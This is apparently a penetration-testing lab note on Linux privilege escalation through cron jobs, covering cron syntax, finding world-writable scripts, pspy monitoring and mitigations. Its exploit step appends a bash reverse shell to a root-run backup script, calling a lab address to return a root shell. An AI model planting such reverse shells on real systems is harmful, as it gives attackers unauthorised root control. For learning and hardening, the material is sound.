### **What is a Cron Job?**

- A _cron job_ is a scheduled task run by the `cron` daemon
- Cron jobs are defined using `crontab` and stored in `/var/spool/cron`
- Entry format:
```sql
* * * * * command_to_execute
┬ ┬ ┬ ┬ ┬
│ │ │ │ │
│ │ │ │ └─ day of week (0 - 7) (Sunday is both 0 and 7)
│ │ │ └─── month (1 - 12)
│ │ └───── day of month (1 - 31)
│ └─────── hour (0 - 23)
└───────── minute (0 - 59)
```

### **Abusing Cron Jobs**

- Cron jobs running as **root** can be abused if:
    - They call **world-writable scripts**
    - Cron jobs/scripts are **misconfigured**

- Attackers can append _malicious commands_ (e.g., reverse shells) to scripts that are executed on a schedule

---

### **Discovery Techniques**

- Find writable files:
```bash
find / -type f -perm -o+w 2>/dev/null
```

- Check for _frequent file creation_ (e.g., `.tgz` every 3 mins indicates `*/3 * * * *`)
- Analyze `/etc/cron.d`, `/etc/cron.daily`, `/var/spool/cron` for jobs
- Use `pspy` to monitor scheduled jobs in real-time (no root required)

---

### **Case Study: Abusing `backup.sh`**

- `backup.sh` located in `/dmz-backups/` is:
    - Owned by root
    - World-writable
    - Called by a cron job every 3 minutes
- Script:
```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

---

### **Exploit Steps**

1. Append reverse shell to script:
```bash
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

2. Set up listener:
3. Wait for cron job to trigger — shell is returned as **root**

---

### **Monitoring with `pspy`**

- Run with:
```bash
./pspy64 -pf -i 1000
```

- Observe cron job execution:
```bash
/bin/bash /dmz-backups/backup.sh
tar --absolute-names ...
```

---

### **Mitigation Tips**

- Never make scripts world-writable
- Restrict cron job ownership and execution permissions
- Audit all files executed by root cron jobs
- Validate and correct cron job timing (`*/3 * * * *` vs. `0 */3 * * *`)
